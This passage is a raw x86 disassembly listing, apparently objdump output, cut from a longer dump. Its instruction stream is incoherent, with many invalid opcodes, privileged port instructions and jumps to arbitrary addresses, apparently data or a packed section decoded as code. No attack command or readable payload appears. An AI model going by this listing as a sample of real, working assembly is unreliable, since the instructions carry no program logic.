  40f9b4:	or     al,0xe2
  40f9b6:	adc    edx,ebp
  40f9b8:	mov    dl,0xac
  40f9ba:	mov    bh,0xc1
  40f9bc:	jecxz  0x40f9ac
  40f9be:	rol    dh,0xf7
  40f9c1:	mov    edi,0xd2bcc8b0
  40f9c6:	jmp    0xf73fe6c3
  40f9cb:	add    al,0xf5
  40f9cd:	stc    
  40f9ce:	add    al,0xd7
  40f9d0:	ror    DWORD PTR [edx],0xc7
  40f9d3:	clc    
  40f9d4:	push   es
  40f9d5:	in     eax,dx
  40f9d6:	jmp    0x40f9c0
  40f9d8:	out    dx,eax
  40f9d9:	rol    dl,0xb7
  40f9dc:	in     al,dx
  40f9dd:	(bad)  
  40f9de:	leave  
  40f9df:	loopne 0x40f9ae
  40f9e1:	mov    ah,0xe6
  40f9e3:	ror    edx,1
  40f9e5:	hlt    
  40f9e6:	inc    ecx
  40f9e8:	aad    0xe3
  40f9ea:	ffreep st(5)
  40f9ec:	icebp  
  40f9ed:	(bad)  
  40f9ee:	sti    
  40f9ef:	fcmovnu st,st(5)
  40f9f1:	add    edx,ebp
  40f9f3:	psubusb mm1,QWORD PTR ds:0xc2c9dce0
  40f9fa:	jmp    0xd6f2a6ab
  40f9ff:	lock aad 0xea
  40fa02:	sti    
  40fa03:	jmp    0x40f9e0
  40fa05:	enter  0x2cf,0xda
  40fa09:	mov    esp,0x2c0f8d3
  40fa0e:	add    dl,bh
  40fa10:	add    al,dh
  40fa12:	out    dx,eax
  40fa13:	(bad)  
  40fa14:	in     eax,dx
  40fa15:	loopne 0x40f9fa
  40fa17:	mov    dl,0xe8
  40fa19:	retf   
  40fa1a:	(bad)  
  40fa1b:	lock xlat BYTE PTR ds:[ebx]
  40fa1d:	icebp  
  40fa1e:	(bad)  
  40fa1f:	leave  
  40fa20:	repz fsubr st,st(7)
  40fa23:	out    dx,al
  40fa24:	iret   
  40fa25:	out    dx,eax
  40fa26:	shl    ecx,1
  40fa28:	clc    
  40fa29:	out    dx,al
  40fa2a:	mov    eax,0xfadcdcf2
  40fa2f:	loop   0x40fa16
  40fa31:	add    cl,BYTE PTR [ecx]
  40fa33:	cmc    
  40fa34:	loopne 0x40fa2e
  40fa36:	loope  0x40fa20
  40fa38:	jmp    0xdbb3:0xb5dcc9e2
  40fa3f:	sti    
  40fa40:	mov    ebx,0xbcb7eecb
  40fa45:	retf   
  40fa46:	mov    ah,0xd0
  40fa48:	add    bl,al
  40fa4a:	mov    eax,0xcbd6fcd7
  40fa4f:	add    eax,0xc8dbddef
  40fa54:	sti    
  40fa55:	inc    al
  40fa57:	into   
  40fa58:	fdivr  DWORD PTR [edx+esi*8-0x1833523d]
  40fa5f:	(bad)
  40fa62:	leave  
  40fa63:	fistp  QWORD PTR [ebx-0x4926092a]
  40fa69:	aad    0xf6
  40fa6b:	rol    edx,cl
  40fa6d:	(bad)  
  40fa6e:	(bad)  
  40fa6f:	(bad)  
  40fa70:	mov    esi,0xeaffede7
  40fa75:	loopne 0x40fa63
  40fa77:	jecxz  0x40fa3c
  40fa79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa7a:	into   
  40fa7b:	jecxz  0x40fa40
  40fa7d:	in     al,dx
  40fa7e:	out    0xeb,eax
  40fa80:	out    0xcf,al
  40fa82:	mov    esi,0xdcd7bfba
  40fa87:	call   esi
  40fa89:	fmulp  st(5),st
  40fa8b:	(bad)  
  40fa8c:	fcmovnu st,st(3)
  40fa8e:	(bad)  
  40fa8f:	hlt    
  40fa90:	add    dl,ah
  40fa92:	push   cs
  40fa93:	or     esp,ebp
  40fa95:	push   cs
  40fa96:	icebp  
  40fa97:	ret    0xc2c1
  40fa9a:	into   
  40fa9b:	iret   
  40fa9c:	out    0xeb,eax
  40fa9e:	sti    
  40fa9f:	jmp    0x40fa4f
  40faa1:	(bad)  
  40faa2:	sti    
  40faa3:	mov    esi,0xf0ffd9b6
  40faa8:	fcomp  st(1)
  40faaa:	in     eax,dx
  40faab:	mov    ebp,0x7c2f1de
  40fab0:	fucomi st,st(6)
  40fab2:	out    0xda,al
  40fab4:	or     bh,dh
  40fab6:	enter  0xace9,0xc0
  40faba:	in     al,0xe4
  40fabc:	stos   BYTE PTR es:[edi],al
  40fabd:	(bad)  
  40fabe:	in     al,dx
  40fabf:	int3   
  40fac0:	fxch   st(1)
  40fac2:	xlat   BYTE PTR ds:[ebx]
  40fac3:	mov    bh,0xfb
  40fac5:	cld    
  40fac6:	mov    esp,0xd0fadffa
  40facb:	mov    esp,0xc6e9bcd1
  40fad0:	stc    
  40fad1:	call   0xfc30d4df
  40fad6:	adc    eax,esi
  40fad8:	jmp    0x40fabb
  40fada:	icebp  
  40fadb:	scas   al,BYTE PTR es:[edi]
  40fadc:	xlat   BYTE PTR ds:[ebx]
  40fadd:	(bad)  
  40fade:	jmp    0x40faaf
  40fae0:	enter  0xbee5,0xc9
  40fae4:	mov    ch,0xc8
  40fae6:	clc    
  40fae7:	loop   0x40faaa
  40fae9:	in     al,dx
  40faea:	repnz (bad) 
  40faed:	shr    ebx,1
  40faef:	hlt    
  40faf0:	jmp    0xc4fa:0xebcf03f6
  40faf7:	iret   
  40faf8:	out    0xe3,al
  40fafa:	(bad)  
  40fafb:	out    dx,al
  40fafc:	ret    0xc2f0
  40faff:	jmp    0xd310f6fe
  40fb04:	call   0xcf24c8f6
  40fb09:	mov    ebp,0xe306ffd5
  40fb0e:	xlat   BYTE PTR ds:[ebx]
  40fb0f:	hlt    
  40fb10:	mov    BYTE PTR [esi],0x7
  40fb13:	pop    es
  40fb14:	retf   
  40fb15:	jmp    0xb7d2:0xd3edf2d3
  40fb1c:	fcmovnbe st,st(7)
  40fb1e:	imul   DWORD PTR [edi-0x260c1131]
  40fb24:	lock mov esp,0x2fb00c8
  40fb2a:	(bad)  
  40fb2b:	test   eax,0xfff0c7e5
  40fb31:	fcompp 
  40fb33:	or     ah,ah
  40fb35:	enter  0xaaeb,0xc8
  40fb39:	icebp  
  40fb3a:	shl    eax,0xb2
  40fb3d:	(bad)
  40fb40:	test   ecx,0xb8fecabb
  40fb46:	in     eax,dx
  40fb47:	push   esp
  40fb49:	add    al,BYTE PTR [ebx]
  40fb4b:	cmc    
  40fb4c:	add    BYTE PTR [eax],al
  40fb4e:	fst    st(6)
  40fb50:	test   BYTE PTR [eax],0xf9
  40fb53:	retf   
  40fb54:	call   0xc433db1a
  40fb59:	mov    dl,0xca
  40fb5b:	rol    bh,1
  40fb5d:	lods   eax,DWORD PTR ds:[esi]
  40fb5e:	(bad)  
  40fb5f:	sti    
  40fb60:	lock out dx,eax
  40fb62:	into   
  40fb63:	mov    bl,0xd1
  40fb65:	clc    
  40fb66:	dec    esi
  40fb68:	call   0xf611ca6a
  40fb6d:	push   es
  40fb6e:	fucom  st(4)
  40fb70:	add    eax,ebp
  40fb72:	cld    
  40fb73:	clc    
  40fb74:	iret   
  40fb75:	loop   0x40fb81
  40fb77:	int3   
  40fb78:	mov    bl,0xcd
  40fb7a:	mov    al,0xe4
  40fb7c:	stos   BYTE PTR es:[edi],al
  40fb7d:	(bad)  
  40fb7f:	rol    esp,cl
  40fb81:	fcmovbe st,st(1)
  40fb83:	jmp    0x40fb62
  40fb85:	mov    ah,0xef
  40fb87:	stc    
  40fb88:	add    edx,edi
  40fb8a:	fld    QWORD PTR [ecx]
  40fb8c:	(bad)  
  40fb8d:	out    0xff,eax
  40fb8f:	loope  0x40fb8b
  40fb91:	(bad)  
  40fb92:	iret   
  40fb93:	fsub   st,st(7)
  40fb95:	jmp    0xcfd5:0xc8b0cdef
  40fb9c:	lods   al,BYTE PTR ds:[esi]
  40fb9d:	mul    edi
  40fb9f:	in     al,0xeb
  40fba1:	repnz repnz mov edx,0xd7d3eddf
  40fba8:	call   0xf53fcf7e
  40fbad:	cld    
  40fbae:	les    eax,FWORD PTR [ebx+ecx*8]
  40fbb1:	leave  
  40fbb2:	in     eax,0xe1
  40fbb4:	repz or eax,0xcde9cdd8
  40fbba:	imul   BYTE PTR [ebp-0x5150e24]
  40fbc0:	out    0xd2,al
  40fbc2:	in     al,0xeb
  40fbc4:	idiv   eax
  40fbc6:	aam    0xf0
  40fbc8:	(bad)  
  40fbca:	ret    
  40fbcb:	shl    dh,1
  40fbcd:	rol    ah,1
  40fbcf:	icebp  
  40fbd0:	out    dx,eax
  40fbd1:	or     cl,dl
  40fbd3:	add    al,0xec
  40fbd5:	lds    ecx,FWORD PTR [edi]
  40fbd7:	lock retf 
  40fbd9:	(bad)  
  40fbda:	mov    cl,0xaf
  40fbdc:	repnz leave 
  40fbde:	loop   0x40fbaf
  40fbe0:	in     al,dx
  40fbe1:	rcl    esp,cl
  40fbe3:	call   0xbe33d5d7
  40fbe8:	hlt    
  40fbe9:	cmc    
  40fbea:	rcr    edi,cl
  40fbec:	fidivr WORD PTR [ebp-0x26f80917]
  40fbf2:	clts   
  40fbf4:	vpsraw ymm4,ymm4,xmm7
  40fbf8:	jecxz  0x40fbd7
  40fbfa:	enter  0xcab1,0xcf
  40fbfe:	(bad)  
  40fbff:	rcr    eax,cl
  40fc01:	fldcw  WORD PTR [ecx+edx*8-0x272f3238]
  40fc08:	loop   0x40fbfa
  40fc0a:	mov    esp,0xfd060003
  40fc0f:	sar    ebp,0xe7
  40fc12:	enter  0xefeb,0xe2
  40fc16:	out    dx,eax
  40fc17:	mov    cl,0xcd
  40fc19:	fmulp  st(3),st
  40fc1b:	in     eax,dx
  40fc1c:	loopne 0x40fbe6
  40fc1e:	mov    ch,0xec
  40fc20:	stc    
  40fc21:	shr    ah,cl
  40fc23:	aam    0xff
  40fc25:	cli    
  40fc26:	mov    ah,0xd2
  40fc28:	lock in eax,dx
  40fc2a:	mov    esp,0xd1f4d9fe
  40fc2f:	mul    esp
  40fc31:	mov    ebp,0xdde5de0a
  40fc36:	call   0xca00ade4
  40fc3b:	loopne 0x40fbf9
  40fc3d:	fucomi st,st(7)
  40fc3f:	stc    
  40fc40:	retf   0xb6ce
  40fc43:	cmc    
  40fc44:	(bad)  
  40fc46:	add    DWORD PTR [edx],eax
  40fc48:	mov    esp,0xfcdde2b9
  40fc4d:	or     ch,cl
  40fc4f:	in     eax,0xdf
  40fc51:	sti    
  40fc52:	mov    esp,0xedfa0cfa
  40fc58:	loopne 0x40fc0c
  40fc5a:	aad    0xe1
  40fc5c:	out    0xca,al
  40fc5e:	mul    esp
  40fc60:	aad    0xcb
  40fc62:	out    dx,eax
  40fc63:	xlat   BYTE PTR ds:[ebx]
  40fc64:	retf   0xd1e3
  40fc67:	int    0xe7
  40fc69:	add    edx,esp
  40fc6b:	fnclex 
  40fc6d:	mul    ah
  40fc6f:	(bad)  
  40fc70:	call   0xe706cb72
  40fc75:	std    
  40fc76:	enter  0xe7e6,0xe0
  40fc7a:	leave  
  40fc7b:	lods   eax,DWORD PTR ds:[esi]
  40fc7c:	out    dx,eax
  40fc7d:	imul   esi
  40fc7f:	rcl    al,0xeb
  40fc82:	mov    dh,0xe4
  40fc84:	fdivr  DWORD PTR [ebp-0x1932090a]
  40fc8a:	sti    
  40fc8b:	cmc    
  40fc8c:	int3   
  40fc8d:	fucom  st(3)
  40fc8f:	or     dh,al
  40fc91:	retf   
  40fc92:	or     al,BYTE PTR [edi]
  40fc94:	sti    
  40fc95:	or     al,0x13
  40fc97:	lods   al,BYTE PTR ds:[esi]
  40fc98:	test   al,0xe7
  40fc9a:	(bad)  
  40fc9b:	(bad)  
  40fc9c:	(bad)  
  40fc9d:	test   ecx,0xd7cfb1ca
  40fca3:	in     eax,dx
  40fca4:	fidivr WORD PTR [eax-0x27433216]
  40fcaa:	pop    es
  40fcab:	push   es
  40fcac:	cli    
  40fcad:	(bad)  
  40fcae:	jecxz  0x40fcb0
  40fcb0:	fsubp  st(6),st
  40fcb2:	or     eax,0xfac5ece3
  40fcb7:	mov    eax,0xe4f3e5ca
  40fcbc:	lods   al,BYTE PTR ds:[esi]
  40fcbd:	int    0xf1
  40fcbf:	(bad)  
  40fcc1:	jmp    0xe2fe:0xcfcad8da
  40fcc8:	rol    DWORD PTR [edx],cl
  40fcca:	pop    es
  40fccb:	std    
  40fccc:	rcr    cl,1
  40fcce:	aam    0xc3
  40fcd0:	in     eax,0x8
  40fcd2:	rol    BYTE PTR [eax*1-0x1a560336],0xde
  40fcda:	jecxz  0x40fcb8
  40fcdc:	aam    0xe8
  40fcde:	mov    bl,0xcf
  40fce0:	ror    ebp,1
  40fce2:	hlt    
  40fce3:	fiadd  WORD PTR [ebx]
  40fce5:	iret   
  40fce6:	fsubr  st(3),st
  40fce8:	enter  0x6bd,0x4
  40fcec:	aam    0xfe
  40fcee:	test   DWORD PTR [ecx],0xfc0900d7
  40fcf4:	add    DWORD PTR ds:0xd3f1c8f2,ecx
  40fcfa:	lods   al,BYTE PTR ds:[esi]
  40fcfb:	shr    bh,cl
  40fcfd:	icebp  
  40fcfe:	mov    ebx,0xcad3b6d2
  40fd03:	repz into 
  40fd05:	ror    cl,1
  40fd07:	rcl    ecx,1
  40fd09:	mov    ecx,0xc2c705e1
  40fd0e:	mov    ah,0x6
  40fd11:	fcmovu st,st(2)
  40fd13:	std    
  40fd14:	fcmovne st,st(0)
  40fd16:	add    esi,esp
  40fd18:	retf   0xdee5
  40fd1b:	fsubr  QWORD PTR [ebp-0x4924292e]
  40fd21:	mov    ecx,0xbadef5cb
  40fd26:	icebp  
  40fd27:	(bad)  
  40fd29:	ror    ah,1
  40fd2b:	in     eax,dx
  40fd2c:	rol    DWORD PTR [edi],cl
  40fd2e:	add    ebx,ecx
  40fd30:	loop   0x40fd20
  40fd32:	cmc    
  40fd33:	in     eax,dx
  40fd34:	into   
  40fd35:	jecxz  0x40fd06
  40fd37:	out    0xd7,eax
  40fd39:	enter  0xf3e7,0xc5
  40fd3d:	out    dx,eax
  40fd3e:	aad    0xe6
  40fd40:	fdiv   DWORD PTR [eax-0x42311b25]
  40fd46:	(bad)  
  40fd47:	shl    dl,1
  40fd49:	iret   
  40fd4a:	rol    BYTE PTR ds:0x3c30400,0xe6
  40fd51:	idiv   ebx
  40fd53:	mov    BYTE PTR [ecx],0xee
  40fd56:	fisub  DWORD PTR [edi-0x1b283c32]
  40fd5c:	sti    
  40fd5d:	iret   
  40fd5e:	enter  0xf2d5,0xea
  40fd62:	neg    ebp
  40fd64:	cld    
  40fd65:	xlat   BYTE PTR ds:[ebx]
  40fd66:	mov    esp,0x3bcbcb8
  40fd6b:	fdivr  st(0),st
  40fd6d:	(bad)  
  40fd70:	or     ebx,esi
  40fd72:	stc    
  40fd73:	out    0xe2,eax
  40fd75:	out    dx,eax
  40fd76:	fsub   st,st(5)
  40fd78:	out    0xe8,eax
  40fd7a:	enter  0xcff7,0xac
  40fd7e:	ror    al,1
  40fd80:	int    0xe5
  40fd82:	out    dx,al
  40fd83:	out    dx,eax
  40fd84:	(bad)  
  40fd86:	out    dx,al
  40fd87:	cmc    
  40fd88:	aad    0xd4
  40fd8a:	int    0xd0
  40fd8c:	add    al,0xda
  40fd8e:	fcom   st(1)
  40fd90:	sti    
  40fd91:	or     bh,bl
  40fd93:	add    al,0xd8
  40fd95:	or     eax,esp
  40fd97:	stos   DWORD PTR es:[edi],eax
  40fd98:	mov    ebp,0xc0aff6b2
  40fd9d:	icebp  
  40fd9e:	ret    0xd7c9
  40fda1:	(bad)  
  40fda2:	aam    0xc4
  40fda4:	(bad)  
  40fda6:	mov    ah,0xff
  40fda8:	pop    es
  40fda9:	out    dx,eax
  40fdaa:	sar    ah,1
  40fdac:	repnz repnz fiadd DWORD PTR [esp+eax*1]
  40fdb1:	add    ah,ah
  40fdb3:	add    edi,edx
  40fdb5:	adc    ebx,ecx
  40fdb7:	iret   
  40fdb8:	retf   
  40fdb9:	in     eax,dx
  40fdba:	rcl    dl,cl
  40fdbc:	in     al,0xe9
  40fdbe:	(bad)  
  40fdc0:	jmp    0xdc09dd75
  40fdc5:	hlt    
  40fdc6:	aam    0xf1
  40fdc8:	add    esi,ebx
  40fdca:	(bad)  
  40fdcc:	cli    
  40fdcd:	out    0xb8,al
  40fdcf:	fdivr  st(5),st
  40fdd1:	(bad)  
  40fdd2:	or     bh,al
  40fdd4:	call   0xb32b02dd
  40fdd9:	icebp  
  40fdda:	out    0xb2,eax
  40fddc:	cmc    
  40fddd:	test   ch,0xda
  40fde0:	(bad)  
  40fde2:	in     al,dx
  40fde3:	mov    esi,0xd6ed03ba
  40fde8:	jecxz  0x40fdcc
  40fdea:	clc    
  40fdeb:	int3   
  40fdec:	add    dl,ch
  40fdee:	jecxz  0x40fdd6
  40fdf0:	(bad)
  40fdf3:	add    al,dl
  40fdf5:	in     eax,0xc8
  40fdf7:	loop   0x40fda9
  40fdf9:	ror    al,0xcf
  40fdfc:	shl    ch,1
  40fdfe:	enter  0xfbaf,0xfe
  40fe02:	sar    esi,1
  40fe04:	shl    esp,cl
  40fe06:	int3   
  40fe07:	test   DWORD PTR [ebx],0xf604e5c1
  40fe0d:	out    0x0,eax
  40fe0f:	cmc    
  40fe10:	add    al,0xe0
  40fe12:	out    0xc4,al
  40fe14:	out    dx,al
  40fe15:	(bad)  
  40fe17:	mov    esp,0xcbe1bce2
  40fe1c:	lods   eax,DWORD PTR ds:[esi]
  40fe1d:	mov    al,0xb6
  40fe1f:	out    dx,al
  40fe20:	mov    bh,0xad
  40fe22:	fcmovbe st,st(2)
  40fe24:	stc    
  40fe25:	int3   
  40fe26:	(bad)  
  40fe27:	sar    BYTE PTR [esp+esi*8-0xa0c2b40],cl
  40fe2e:	cld    
  40fe2f:	retf   
  40fe30:	add    bl,ch
  40fe32:	cli    
  40fe33:	enter  0xc1fd,0x9
  40fe37:	retf   0xc7c3
  40fe3a:	out    dx,al
  40fe3b:	call   0xb126ce07
  40fe40:	div    BYTE PTR [ecx-0x22414c4c]
  40fe46:	fstp   TBYTE PTR [esi-0x33938f9]
  40fe4c:	(bad)  
  40fe4d:	out    0xe0,eax
  40fe4f:	lock aad 0x8
  40fe52:	cmc    
  40fe53:	jmp    ebp
  40fe55:	loop   0x40fe45
  40fe57:	lods   al,BYTE PTR ds:[esi]
  40fe58:	in     al,0xa5
  40fe5a:	jmp    0x40fe24
  40fe5c:	enter  0xf2b3,0xe7
  40fe60:	iret   
  40fe61:	xlat   BYTE PTR ds:[ebx]
  40fe62:	(bad)  
  40fe63:	fnstsw WORD PTR [ebx-0x7421505]
  40fe69:	(bad)  
  40fe6b:	add    al,0xba
  40fe6d:	ret    
  40fe6e:	add    al,0xff
  40fe70:	test   BYTE PTR [edi],0xe6
  40fe73:	or     bh,ch
  40fe75:	out    0x3,eax
  40fe77:	rol    bl,0xf6
  40fe7a:	mov    dl,0xab
  40fe7c:	mov    esp,0xbbf0f9b0
  40fe81:	retf   0xd8be
  40fe84:	imul   bl
  40fe86:	inc    DWORD PTR [edx]
  40fe88:	std    
  40fe89:	f2xm1  
  40fe8b:	add    dh,dh
  40fe8d:	add    edx,esp
  40fe8f:	fimul  DWORD PTR [edx]
  40fe91:	iret   
  40fe92:	in     eax,0xee
  40fe94:	in     eax,0xea
  40fe96:	loop   0x40fe69
  40fe98:	shl    ebx,0xac
  40fe9b:	aam    0xf4
  40fe9d:	out    0xb0,eax
  40fe9f:	shl    bl,1
  40fea1:	into   
  40fea2:	idiv   DWORD PTR [edx-0x2e2f032b]
  40fea8:	inc    BYTE PTR [esi]
  40feaa:	sar    BYTE PTR [edi+0x2f8dde5],1
  40feb0:	stc    
  40feb1:	add    edx,edi
  40feb3:	retf   
  40feb4:	aam    0xdd
  40feb6:	adc    ah,dl
  40feb8:	lods   al,BYTE PTR ds:[esi]
  40feb9:	lods   eax,DWORD PTR ds:[esi]
  40feba:	fsub   st(5),st
  40febc:	rol    esi,1
  40febe:	mov    dl,0xb4
  40fec0:	mov    edx,0xb5f4f9ff
  40fec5:	(bad)  
  40fec7:	fistp  QWORD PTR [ecx-0xe3f2c2a]
  40fecd:	jecxz  0x40feb9
  40fecf:	fcmovu st,st(3)
  40fed1:	loope  0x40fecb
  40fed3:	fiadd  DWORD PTR [ecx]
  40fed5:	ficom  WORD PTR [edx]
  40fed7:	jecxz  0x40fec5
  40fed9:	rol    ah,cl
  40fedb:	scas   eax,DWORD PTR es:[edi]
  40fedc:	repz shl DWORD PTR [esi+ecx*8-0x2914522b],0xfb
  40fee5:	jmp    0x40feb7
  40fee7:	aad    0xfd
  40fee9:	add    ah,al
  40feeb:	loopne 0x40fec2
  40feed:	stc    
  40feee:	icebp  
  40feef:	sar    cl,0xf6
  40fef2:	(bad)  
  40fef3:	or     ecx,DWORD PTR [edi+eiz*8]
  40fef6:	retf   
  40fef7:	lods   eax,DWORD PTR ds:[esi]
  40fef8:	out    dx,al
  40fef9:	jecxz  0x40fec2
  40fefb:	loopne 0x40febf
  40fefd:	shr    ebp,1
  40feff:	(bad)  
  40ff00:	rol    ebp,cl
  40ff02:	(bad)  
  40ff03:	(bad)  
  40ff04:	fstp   st(3)
  40ff06:	leave  
  40ff07:	loopne 0x40fed9
  40ff09:	aam    0xd8
  40ff0b:	add    al,ah
  40ff0d:	call   esp
  40ff0f:	loope  0x40fef1
  40ff11:	or     bl,cl
  40ff13:	push   es
  40ff14:	iret   
  40ff15:	or     esp,ebx
  40ff17:	(bad)  
  40ff18:	lods   eax,DWORD PTR ds:[esi]
  40ff19:	rol    bh,0xf6
  40ff1c:	mov    esp,0xdae8f9ce
  40ff21:	mov    bh,0xf3
  40ff23:	(bad)  
  40ff24:	(bad)  
  40ff25:	in     eax,dx
  40ff26:	stc    
  40ff27:	shl    edx,1
  40ff29:	(bad)  
  40ff2b:	ret    
  40ff2c:	in     eax,0xc0
  40ff2e:	add    eax,0xe400f4e7
  40ff33:	int    0xe0
  40ff35:	adc    dl,BYTE PTR [ebx]
  40ff37:	shr    BYTE PTR [ecx-0x4d304c0e],1
  40ff3d:	xlat   BYTE PTR ds:[ebx]
  40ff3e:	in     eax,dx
  40ff3f:	mov    dh,0xc8
  40ff41:	repnz dec ebx
  40ff44:	add    edi,DWORD PTR [edi-0x24454034]
  40ff4a:	lock add eax,ecx
  40ff4d:	shr    edx,0xd9
  40ff50:	loopne 0x40ff4e
  40ff52:	leave  
  40ff53:	cld    
  40ff54:	(bad)  
  40ff56:	in     al,0xa7
  40ff58:	retf   0xe8cd
  40ff5b:	loopne 0x40ff43
  40ff5d:	int3   
  40ff5e:	out    dx,eax
  40ff5f:	cmc    
  40ff60:	retf   0xd6e9
  40ff63:	int    0xf5
  40ff65:	fdivr  st,st(2)
  40ff67:	icebp  
  40ff68:	enter  0xbff1,0x5
  40ff6c:	(bad)  
  40ff6d:	fcmovb st,st(3)
  40ff6f:	add    eax,0x206fee7
  40ff74:	fsub   st(5),st
  40ff76:	jmp    0x40ff65
  40ff78:	iret   
  40ff79:	repz loop 0x40ff67
  40ff7c:	(bad)  
  40ff7d:	hlt    
  40ff7e:	ret    0xcee1
  40ff81:	fisubr WORD PTR [edx+esi*8-0x1d174442]
  40ff88:	in     al,dx
  40ff89:	xlat   BYTE PTR ds:[ebx]
  40ff8a:	in     eax,0xbf
  40ff8c:	lock aam 0x4
  40ff8f:	(bad)
  40ff92:	leave  
  40ff93:	(bad)  
  40ff94:	clc    
  40ff95:	(bad)  
  40ff96:	faddp  st(4),st
  40ff98:	jmp    0xd5eb:0xf7c8cae7
  40ff9f:	scas   eax,DWORD PTR es:[edi]
  40ffa0:	sar    DWORD PTR [eax-0x12082d22],cl
  40ffa6:	add    edi,edi
  40ffa8:	enter  0xe3d3,0xf3
  40ffac:	out    0xbc,al
  40ffae:	add    eax,0xc9e3c4c4
  40ffb3:	iret   
  40ffb4:	fcmovnu st,st(6)
  40ffb6:	(bad)  
  40ffb8:	jecxz  0x40ffab
  40ffba:	enter  0xf3ab,0xc1
  40ffbe:	div    BYTE PTR [ecx-0x3125212c]
  40ffc4:	mov    esi,0xc2d2fade
  40ffc9:	mov    edi,0xdbf4e3b8
  40ffce:	jmp    0x102bc9ab
  40ffd3:	retf   0xdbcc
  40ffd6:	enter  0xc0ec,0xf1
  40ffda:	mov    esi,0xe2b5f4c5
  40ffdf:	retf   0xc7d6
  40ffe2:	out    0xf8,al
  40ffe4:	mov    dl,0x2
  40ffe6:	sar    BYTE PTR [ebx-0x6182d05],cl
  40ffec:	(bad)  
  40ffed:	add    cl,BYTE PTR [edx]
  40ffef:	add    al,BYTE PTR [edx+edi*8]
  40fff2:	out    dx,eax
  40fff3:	add    ebx,eax
  40fff5:	cli    
  40fff6:	fld1   
  40fff8:	jmp    0xe307ebe0
  40fffd:	cmc    
  40fffe:	lock in al,dx
  410000:	jmp    0xdaf8ccba
  410005:	mov    esp,0xe6ddc9e3
  41000a:	stc    
  41000b:	hlt    
  41000c:	clc    
  41000d:	(bad)  
  41000f:	loop   0x40ffe9
  410011:	std    
  410012:	pop    es
  410013:	(bad)  
  410015:	(bad)  
  410017:	fxch   st(2)
  410019:	fucomp st(7)
  41001b:	out    0xc1,al
  41001d:	in     eax,0xf3
  41001f:	aam    0xef
  410021:	mov    edi,0xd0cedcb4
  410026:	aad    0x1
  410028:	sti    
  410029:	add    bl,bh
  41002b:	mov    DWORD PTR ds:0xdcdbc4bd,0xf9e1fdc4
  410035:	stc    
  410036:	int3   
  410037:	bnd jmp 0xd029b22e
  41003d:	repz test al,0xd8
  410040:	cli    
  410041:	repz leave 
  410043:	(bad)  
  410044:	out    dx,al
  410045:	retf   0xdeec
  410048:	stc    
  410049:	fiadd  WORD PTR ds:0xcbf2d0ec
  41004f:	in     eax,0xc9
  410051:	add    ebp,esp
  410053:	or     cl,bh
  410055:	or     eax,0xebd7e8cf
  41005a:	shl    BYTE PTR [ebx-0xa05143a],1
  410060:	repz sti 
  410062:	jmp    0x3ada3a
  410067:	(bad)  
  410069:	(bad)  
  41006b:	test   dh,0xd2
  41006e:	icebp  
  41006f:	cmc    
  410070:	(bad)  
  410071:	(bad)  
  410073:	push   cs
  410074:	std    
  410075:	fisttp QWORD PTR ds:0xbcc6aace
  41007b:	jmp    0xca31cc42
  410080:	int3   
  410081:	fldlg2 
  410083:	sti    
  410084:	mov    dl,0xb9
  410086:	call   0xf915c169
  41008b:	(bad)  
  41008d:	aad    0xdc
  41008f:	rol    bh,1
  410091:	fsubr  st(1),st
  410093:	(bad)  
  410094:	in     al,0xcd
  410096:	out    dx,al
  410097:	jmp    0x410077
  410099:	test   al,0xa4
  41009b:	fsub   st(3),st
  41009d:	(bad)  
  41009e:	repz retf 0xc9ce
  4100a2:	lock cli 
  4100a4:	jecxz  0x4100a9
  4100a6:	add    edx,eax
  4100a8:	rcr    ecx,0xf4
  4100ab:	lock lds eax,FWORD PTR [edi]
  4100ae:	xlat   BYTE PTR ds:[ebx]
  4100af:	dec    BYTE PTR [ecx]
  4100b1:	aam    0xe
  4100b3:	(bad)  
  4100b5:	add    al,BYTE PTR ds:0xd2acc1f0
  4100bb:	fdiv   st(3),st
  4100bd:	lods   al,BYTE PTR ds:[esi]
  4100be:	loop   0x410084
  4100c0:	(bad)  
  4100c1:	(bad)  
  4100c2:	(bad)
  4100c5:	in     al,dx
  4100c6:	loope  0x4100cb
  4100c8:	shl    BYTE PTR [ebp+0x5c3fee7],1
  4100ce:	sti    
  4100cf:	loopne 0x4100b4
  4100d1:	or     ebp,ebp
  4100d3:	out    0xfa,eax
  4100d5:	iret   
  4100d6:	adc    bl,bh
  4100d8:	repz iret 
  4100da:	out    dx,al
  4100db:	(bad)  
  4100dc:	(bad)  
  4100dd:	test   dl,0xf2
  4100e0:	in     eax,dx
  4100e1:	mov    edx,0x3dad0c9
  4100e6:	(bad)  
  4100e8:	add    ebx,ebx
  4100ea:	add    DWORD PTR [edi],eax
  4100ec:	sti    
  4100ed:	ret    0xd8f0
  4100f0:	leave  
  4100f1:	or     ecx,DWORD PTR [esi]
  4100f3:	push   esp
  4100f5:	fmul   DWORD PTR [ebx]
  4100f7:	jmp    0xe325cee3
  4100fc:	ret    
  4100fd:	rcr    ebx,0xb5
  410100:	retf   
  410101:	(bad)  
  410103:	mov    ch,0xcc
  410105:	repnz xlat BYTE PTR ds:[ebx]
  410107:	ret    
  410108:	cmc    
  410109:	clc    
  41010a:	(bad)  
  41010c:	(bad)  
  41010d:	loope  0x4100f5
  41010f:	ret    
  410110:	leave  
  410111:	(bad)  
  410113:	or     eax,DWORD PTR [ecx]
  410115:	push   cs
  410116:	or     ebp,ebp
  410118:	mov    al,0xb7
  41011a:	out    0xb7,al
  41011c:	icebp  
  41011d:	in     al,dx
  41011e:	in     eax,0xe0
  410120:	fcmove st,st(4)
  410122:	jmp    0xde2ef5f2
  410127:	fiadd  DWORD PTR [eax]
  410129:	ret    0xbcf5
  41012c:	inc    edx
  41012e:	add    eax,0xdedbe3fa
  410133:	in     eax,dx
  410134:	fiadd  WORD PTR [ebx]
  410136:	jmp    0xe5ed:0xcba5d7ad
  41013d:	out    0xb5,eax
  41013f:	loopne 0x410106
  410141:	jmp    0xcdf3fc0a
  410146:	mov    eax,0xfa02cec9
  41014b:	ret    
  41014c:	(bad)  
  41014d:	mov    ecx,0xebeaff03
  410152:	or     DWORD PTR [esi],ecx
  410154:	int3   
  410155:	fimul  WORD PTR [eax]
  410157:	(bad)  
  410158:	lock in al,dx
  41015a:	ret    0xd2cc
  41015d:	mov    ah,0xdb
  41015f:	shl    al,0xba
  410162:	fcmove st,st(7)
  410164:	mov    ebp,0xccf2bbb4
  410169:	mov    edi,0xdadee1c7
  41016e:	jmp    0xb44f643
  410173:	(bad)  
  410175:	loope  0x410163
  410177:	shl    eax,1
  410179:	int3   
  41017a:	iret   
  41017b:	in     al,dx
  41017c:	jmp    0xdded:0xd6e6b1a9
